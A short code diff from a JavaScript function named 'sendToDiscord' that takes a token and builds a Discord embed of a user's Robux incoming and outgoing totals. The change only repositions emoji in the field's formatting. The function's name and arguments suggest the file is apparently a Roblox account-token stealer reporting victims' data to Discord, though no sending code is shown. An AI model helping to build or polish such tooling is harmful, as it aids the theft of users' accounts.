@@ -1677,7 +1677,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
           },
           {
             name: "<:emoji_31:1410233610031857735> Robux In/Out",
-            value: `${userData.robuxIncoming ||<:emoji_31:1410233610031857735> 0}/${userData.robuxOutgoing ||<:emoji_31:1410233610031857735> 0}`,
+            value: `<:emoji_31:1410233610031857735> ${userData.robuxIncoming || 0} / <:emoji_31:1410233610031857735> ${userData.robuxOutgoing || 0}`,
             inline: true
           },
           {
